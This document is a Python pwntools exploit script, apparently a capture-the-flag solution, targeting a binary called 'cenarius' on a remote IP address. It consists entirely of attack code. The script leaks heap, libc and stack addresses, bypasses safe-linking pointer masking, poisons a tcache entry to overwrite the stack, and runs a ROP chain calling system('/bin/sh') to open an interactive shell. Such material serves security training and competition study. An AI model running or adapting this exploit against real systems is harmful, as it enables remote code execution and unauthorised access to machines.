from pwn import *

libc = ELF('./libc.so.6')
elf = ELF('./cenarius')
# p = elf.process()
p = remote('141.164.48.191', 10002)

def set(data):
	p.sendlineafter(b'$ ', b'set ' + bytes(data))

def unset(data):
	p.sendlineafter(b'$ ', b'unset ' + bytes(data))

def echo(data):
	p.sendlineafter(b'$ ', b'echo ' + bytes(data))

def mask(addr):
	return addr ^ (heap_base >> 12)

set(b'a=1')
unset(b'a')

set(b'a=')
echo(b'a')

p.recvuntil(b'a: ')

heap_base = u64(p.recvline().strip().ljust(8, b'\x00')) << 12
print(hex(heap_base))

set(b'b=' + b'b'*0x450)
set(b'c=3')
unset(b'c')
unset(b'a')
unset(b'b')

echo(p64(mask(heap_base + 0x2a0)))

p.recvuntil(b': ')

libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x218cc0
print(hex(libc.address))

ret = libc.address + 0x2e6c6
system = libc.sym['system']

set(b'd=' + b'a'*0x8 + p64(0) + p64(libc.sym['environ']) + p64(0))
echo(b'a'*8)
p.recvuntil(b': ')

stack_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(stack_leak))

unset(b'd')
set(b'd=' + p64(1) + p64(0x61) + p64(heap_base + 0x2b0) + p64(0))
unset(b'\x01')

set(b'e=' + p64(0)*3 + p64(0x21) + p64(mask(stack_leak - 0x678)) + p64(0)*6)

set(b'/bin/sh=a')
set(b'asd=' + p64(0) + p64(ret) + p64(system))

p.interactive()